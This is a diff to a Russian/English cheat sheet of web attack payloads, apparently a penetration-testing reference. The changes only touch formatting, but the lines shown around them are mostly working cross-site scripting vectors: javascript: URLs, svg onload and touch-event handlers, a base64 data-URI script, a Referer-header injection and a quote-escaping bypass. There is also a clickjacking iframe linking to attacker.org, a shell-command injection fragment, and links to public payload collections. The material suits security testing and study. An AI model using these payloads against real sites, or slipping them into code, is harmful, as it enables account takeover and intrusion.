@@ -191,22 +191,22 @@ DOM
   signup?next=javascript%3Aalert%28%27xss%27%29
   /frame#data:text/plain,alert('1')
   
-Через proxy вместо годного url вставить script (json)↓
+Через proxy вместо годного url вставить script (json)
   "url": "javascript:alert(1)"
 
-"Share" button add: ↓
+"Share" button add: 
   "><svg/onload=confirm(1)>
 
-Change the logo link↓
+Change the logo link
   javascripT://https://google.com%0aalert(1);//https://google.com
 
-Mobile version↓
+Mobile version
   " ontouchstart="alert(1)
 
-Greedy XSS Regex filter↓
+Greedy XSS Regex filter
   <%0crameset%20src=''>
 
-Изменить имя <img src="//domain.xyz/xss.swf"> ↓
+Изменить имя <img src="//domain.xyz/xss.swf"> 
 КОД для swf расширение xss.as
   package {
    import flash.display.*;
@@ -224,10 +224,10 @@ Blind stored xss
 Reflective Xss
   </script><svg><script>/<@/>alert(1337)</script>  
   
-Xss, через base64↓
+Xss, через base64
   <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=">hack</a>
   
-XSS - Generic(пользователь может передать в качестве префикса вектора атаки пару \', пройдя через механизм экранирования, пара примет вид \\', следовательно, одинарная кавычка потеряет статус экранирования)↓
+XSS - Generic(пользователь может передать в качестве префикса вектора атаки пару \', пройдя через механизм экранирования, пара примет вид \\', следовательно, одинарная кавычка потеряет статус экранирования)
   #/')+alert(document.domain)//
 
 Xss(через загрузку json)
@@ -240,10 +240,10 @@ Xss(через загрузку json)
  }
 }
 
-Xss reflected через заголовок http Referer↓
+Xss reflected через заголовок http Referer
   Referer: http://www.google.com/search?hl=en&q=c5obc'+alert(1)+'p7yd5
 
-Перехват нажатий и подмена интерфейса↓
+Перехват нажатий и подмена интерфейса
   <a href="http://attacker.org"><iframe src="http://example.org/"></iframe></a>
 
 В поле формы, предназначенное для названия изображения
@@ -644,7 +644,11 @@ https://example.com”|ls “-la
 
 
 https://github.com/danielmiessler/SecLists/tree/master/Fuzzing
+
 https://github.com/swisskyrepo/PayloadsAllTheThings
+
 https://sking7.github.io/articles/218647712.html
+
 https://github.com/fuzzdb-project/fuzzdb
+
 https://github.com/cujanovic/CRLF-Injection-Payloads/blob/master/CRLF-payloads.txt
